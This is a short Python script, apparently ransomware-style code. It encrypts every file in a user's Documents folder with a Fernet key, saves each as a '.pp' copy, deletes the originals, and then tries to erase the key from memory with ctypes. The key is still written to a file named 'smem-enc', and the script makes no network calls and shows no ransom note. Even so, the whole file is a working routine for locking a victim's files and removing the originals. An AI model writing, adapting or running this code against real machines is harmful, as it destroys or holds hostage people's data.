from cryptography.fernet import Fernet
import os
import ctypes

# Generate a random symmetric key
symmetric_key = Fernet.generate_key()

# Save the symmetric key to a file
with open("smem-enc", "wb") as key_file:
    key_file.write(symmetric_key)

# Create a Fernet cipher with the key
cipher = Fernet(symmetric_key)

# Define the directory to encrypt
directory_to_encrypt = "/home/chris/Documents"

# Iterate through files in the directory
for filename in os.listdir(directory_to_encrypt):
    filepath = os.path.join(directory_to_encrypt, filename)

    # Check if it's a file
    if os.path.isfile(filepath):
        # Read the content of the file
        with open(filepath, "rb") as file:
            plaintext = file.read()

        # Encrypt the file content
        ciphertext = cipher.encrypt(plaintext)

        # Create a new filename with a new extension
        encrypted_filename = filename + ".pp"
        encrypted_filepath = os.path.join(directory_to_encrypt, encrypted_filename)

        # Write the encrypted content to the new file
        with open(encrypted_filepath, "wb") as encrypted_file:
            encrypted_file.write(ciphertext)

        # Delete the original file
        os.remove(filepath)

# Explicitly clear the symmetric key from memory
ctypes.memset(symmetric_key, 0, len(symmetric_key))

print("Encryption completed.")
